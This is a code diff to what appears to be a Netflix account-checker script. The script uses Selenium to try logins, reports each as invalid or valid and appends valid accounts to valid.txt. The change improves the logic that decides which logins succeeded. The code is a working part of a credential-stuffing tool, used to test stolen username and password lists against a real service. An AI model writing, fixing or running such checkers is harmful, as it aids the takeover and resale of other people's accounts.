@@ -113,11 +113,11 @@ def main():
                                 wait.until(lambda d: d.current_url != page or d.find_elements(By.XPATH, '//div[@id="loginErrorMessage"]'))
                             except Exception:
                                 pass
-                            if browser.current_url == 'https://www.netflix.com/login' or browser.find_elements(By.XPATH,
-                                                                                                              '//div[@id="loginErrorMessage"]'):
+                            error_msgs = browser.find_elements(By.XPATH, '//div[@id="loginErrorMessage"]')
+                            still_on_login = browser.current_url.startswith('https://www.netflix.com/login')
+                            if still_on_login and error_msgs:
                                 print(f"{RED} Invalid Account", end='')
-                            if browser.current_url == 'https://www.netflix.com/browse' or browser.find_elements(By.XPATH,
-                                                                                                                '//div[@class="profiles-gate-container"]'):
+                            elif not still_on_login:
                                 print(f"{GREEN} Valid Account - Stored", end='')
                                 hits += 1
                                 with open('valid.txt', 'a') as valid:
